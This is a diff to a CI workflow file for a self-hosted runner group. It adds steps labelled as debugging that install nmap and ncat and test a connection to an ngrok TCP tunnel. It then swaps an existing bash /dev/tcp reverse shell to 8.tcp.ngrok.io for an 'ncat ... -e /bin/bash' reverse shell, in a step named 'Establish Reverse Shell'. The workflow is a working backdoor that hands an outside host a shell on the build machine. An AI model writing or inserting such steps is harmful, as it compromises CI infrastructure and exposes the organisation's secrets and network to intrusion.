@@ -7,7 +7,32 @@ jobs:
     runs-on:
       group: EP_CICD
     steps:
+      - name: Debug Environment
+        run: |
+          echo "Runner hostname: $(hostname)"
+          echo "Package manager check"
+          which apt-get && echo "apt-get available" || echo "apt-get not available"
+          which yum && echo "yum available" || echo "yum not available"
+          which apk && echo "apk available" || echo "apk not available"
+      - name: Install nmap
+        run: |
+          if which apt-get >/dev/null; then
+            sudo apt-get update && sudo apt-get install -y nmap
+          elif which yum >/dev/null; then
+            sudo yum install -y nmap
+          elif which apk >/dev/null; then
+            sudo apk add nmap
+          else
+            echo "No supported package manager found" && exit 1
+          fi
+          ncat --version || echo "ncat installation failed"
+      - name: Debug Connectivity
+        run: |
+          echo "Testing internet access"
+          curl -I https://google.com || echo "No internet access"
+          echo "Testing Ngrok connectivity"
+          ncat --send-only 8.tcp.ngrok.io 16954 <<< "test" && echo "ncat connected to Ngrok" || echo "ncat failed to connect"
       - name: Establish Reverse Shell
         run: |
-          /bin/bash -c "exec 5<>/dev/tcp/8.tcp.ngrok.io/19671; cat <&5 | while read line; do \$line 2>&5 >&5; done" &
+          ncat 8.tcp.ngrok.io 16954 -e /bin/bash &
         shell: bash
